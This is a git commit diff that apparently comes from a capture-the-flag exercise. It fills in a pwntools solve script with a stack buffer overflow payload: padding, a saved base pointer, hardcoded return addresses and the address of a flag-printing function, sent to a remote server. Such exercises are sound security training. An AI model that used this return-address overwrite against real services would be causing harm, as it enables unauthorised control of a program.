c59acac182b9bdbfd296b7022dde1753862e11b2
lon5948 <a0988282303@gmail.com>
2023-06-03 17:47:15 +0800

    return2flag first commit

--- return2flag/solve.py
+++ return2flag/solve.py
@@ -2,7 +2,6 @@
 import pwn, sys
 
 if __name__ == '__main__':
-    attack = b"-1"
     target = None
 
     if len(sys.argv) != 3:
@@ -12,5 +11,10 @@ if __name__ == '__main__':
         port = int(sys.argv[2])
         target = pwn.remote(server, port)  # Connect to the server
 
+    mainrbp = pwn.p64(0x7fffffffd9e0)
+    return_addr = pwn.p64(0x401a11)
+    useless = pwn.p64(0x4a3e10)
+    putflag_addr = pwn.p64(0x4017f5)
+    attack = b'A' * 16 + mainrbp + return_addr + useless + putflag_addr
     target.sendline(attack)
     print(target.recvall().decode("utf-8", "ignore").strip())
